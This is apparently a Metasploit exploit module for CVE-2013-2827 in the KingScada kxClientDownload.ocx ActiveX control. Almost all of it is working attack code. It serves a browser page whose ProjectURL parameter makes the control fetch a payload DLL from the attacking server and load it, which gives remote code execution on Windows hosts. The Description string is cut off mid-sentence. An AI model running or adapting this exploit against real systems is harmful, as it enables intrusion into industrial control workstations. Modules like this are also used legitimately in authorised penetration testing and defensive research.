# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::BrowserExploitServer
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;KingScada kxClientDownload.ocx ActiveX Remote Code Execution&#039;,
      &#039;Description&#039;    => %q{
        This module abuses the kxClientDownload.ocx ActiveX control distributed with WellingTech KingScada.
        The ProjectURL property can be abused to download and load arbitrary DLLs from
        arbitrary locations, leading to arbitrary code execution, because of a dangerous
        usage of LoadLibrary. Due to the nature of the vulnerability, this module will work
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Andrea Micalizzi&#039;,  # aka rgod original discovery
          &#039;juan vazquez&#039;       # Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2013-2827&#039;],
          [&#039;OSVDB&#039;, &#039;102135&#039;],
          [&#039;BID&#039;, &#039;64941&#039;],
          [&#039;ZDI&#039;, &#039;14-011&#039;],
          [&#039;URL&#039;, &#039;http://ics-cert.us-cert.gov/advisories/ICSA-13-344-01&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;,
        },
      &#039;BrowserRequirements&#039; =>
        {
          :source      => /script|headers/i,
          :os_name     => Msf::OperatingSystems::WINDOWS,
          :ua_name     => /MSIE|KXCLIE/i
        },
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;           => 2048,
          &#039;StackAdjustment&#039; => -3500,
          &#039;DisableNopes&#039;    => true
        },
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic&#039;, { } ]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Jan 14 2014&#039;))
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Requested: #{request.uri}")

    if request.uri =~ /\/libs\/.*\.dll/
      print_good("Sending DLL payload")
      send_response(cli,
        generate_payload_dll(:code => get_payload(cli, target_info)),
        &#039;Content-Type&#039; => &#039;application/octet-stream&#039;
      )
      return
    elsif request.uri =~ /\/libs\//
      print_status("Sending not found")
      send_not_found(cli)
      return
    end

    content = <<-EOS
<html>
<body>
<object classid=&#039;clsid:1A90B808-6EEF-40FF-A94C-D7C43C847A9F&#039; id=&#039;#{rand_text_alpha(10 + rand(10))}&#039;>
<param name="ProjectURL" value="#{get_module_uri}"></param>
</object>
</body>
</html>
    EOS

    print_status("Sending #{self.name}")
    send_response_html(cli, content)
  end

end

